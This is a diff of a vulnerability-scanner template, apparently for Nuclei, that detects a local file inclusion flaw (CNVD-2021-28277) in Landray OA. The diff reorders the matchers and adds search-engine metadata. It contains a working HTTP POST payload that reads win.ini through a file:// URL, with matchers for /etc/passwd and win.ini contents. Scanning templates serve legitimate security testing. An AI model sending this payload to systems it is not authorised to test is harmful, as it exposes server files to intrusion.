@@ -1,5 +1,4 @@
 id: CNVD-2021-28277
-
 info:
   name: Landray-OA - Local File Inclusion
   author: pikpikcu,daffainfo
@@ -14,12 +13,23 @@ info:
     cwe-id: CWE-22
     cpe: cpe:2.3:a:landray:landray_office_automation:*:*:*:*:*:*:*:*
   metadata:
+    fofa-query: app="Landray OA system"
     max-request: 2
+    product: landray_office_automation
     vendor: landray
   tags: cnvd,cnvd2021,landray,lfi,vuln
-
 http:
-  - raw:
+  - matchers:
+      - condition: or
+        regex:
+          - 'root:.*:0:0:'
+          - for 16-bit app support
+        type: regex
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    raw:
       - |
         POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
         Host: {{Hostname}}
@@ -34,18 +44,4 @@ http:
         Content-Type: application/x-www-form-urlencoded
 
         var={"body":{"file":"file:///c://windows/win.ini"}}
-
     stop-at-first-match: true
-
-    matchers-condition: and
-    matchers:
-      - type: regex
-        regex:
-          - "root:.*:0:0:"
-          - "for 16-bit app support"
-        condition: or
-
-      - type: status
-        status:
-          - 200
-
